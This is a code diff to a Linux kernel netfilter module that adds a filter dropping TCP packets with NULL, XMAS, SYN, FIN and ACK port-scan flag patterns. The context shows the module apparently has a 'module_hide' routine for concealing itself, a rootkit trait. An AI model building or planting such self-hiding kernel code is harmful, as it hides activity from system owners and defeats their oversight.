@@ -32,6 +32,52 @@ static short module_hidden = 0;
 int whitelist[]={53,80,443};
 
 
+unsigned int filter_port_scans(struct sk_buff *skb)
+{
+	struct tcphdr *tcp_header=(struct tcphdr *) skb_transport_header(skb);
+
+// NULL SCAN 
+		if(	tcp_header->syn == 0 && tcp_header->ack == 0
+			&& tcp_header->urg == 0 && tcp_header->rst == 0 
+			&& tcp_header->fin == 0 && tcp_header->psh == 0)
+			return NF_DROP;
+
+// XMAS SCAN 
+		if(	tcp_header->syn == 0 && tcp_header->ack == 0
+			&& tcp_header->urg == 1 && tcp_header->rst == 0 
+			&& tcp_header->fin == 1 && tcp_header->psh == 1)
+			return NF_DROP;
+
+// SYN SCAN 
+		if(	tcp_header->syn == 1 && tcp_header->ack == 0
+			&& tcp_header->urg == 0 && tcp_header->rst == 0 
+			&& tcp_header->fin == 0 && tcp_header->psh == 0)
+			return NF_DROP;
+
+		if(	tcp_header->syn == 1 && tcp_header->ack == 1
+			&& tcp_header->urg == 0 && tcp_header->rst == 0 
+			&& tcp_header->fin == 0 && tcp_header->psh == 0)
+			return NF_DROP;
+// FIN SCAN
+		if(	tcp_header->syn == 0 && tcp_header->ack == 0
+			&& tcp_header->urg == 0 && tcp_header->rst == 0 
+			&& tcp_header->fin == 1 && tcp_header->psh == 0)
+			return NF_DROP;
+
+		if(	tcp_header->syn == 0 && tcp_header->ack == 0
+			&& tcp_header->urg == 1 && tcp_header->rst == 0 
+			&& tcp_header->fin == 0 && tcp_header->psh == 1)
+			return NF_DROP;
+// ACK SCAN
+		if(	tcp_header->syn == 0 && tcp_header->ack == 1
+			&& tcp_header->urg == 0 && tcp_header->rst == 0 
+			&& tcp_header->fin == 0 && tcp_header->psh == 0)
+			return NF_DROP;
+
+
+	return 55;
+}
+
 void module_hide(void)
 {
 
@@ -177,7 +223,8 @@ unsigned int test_tcp(struct sk_buff *skb)
 			i++;
 		}
 
-	return 55;
+
+	return filter_port_scans(skb);
 }
 
 unsigned int main_hook( unsigned int hooknum, 
@@ -200,8 +247,7 @@ unsigned int main_hook( unsigned int hooknum,
 			res=test_icmp(skb);
 
 		if(res!=55)
-			return res;
-		
+			return res;	
 
 		if(ip_hdr->protocol == IPPROTO_UDP)
 			res=test_udp(skb);
